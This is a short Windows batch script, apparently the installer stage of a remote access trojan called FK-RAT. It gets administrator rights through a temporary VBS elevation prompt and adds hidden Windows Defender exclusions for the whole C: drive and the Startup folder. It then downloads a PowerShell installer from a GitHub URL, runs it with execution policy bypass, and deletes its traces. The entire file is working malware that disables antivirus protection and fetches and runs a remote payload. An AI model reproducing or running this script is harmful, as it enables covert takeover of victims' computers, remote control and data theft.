REM get admin permissions for script
@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM ready up to diable defender
powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:/' -Force -ea 0 | Out-Null";
powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup' -Force -ea 0 | Out-Null";

REM rat resources
powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
powershell -windowstyle hidden -ep bypass ./installer.ps1

REM self delete
del installer.ps1
del wget.cmd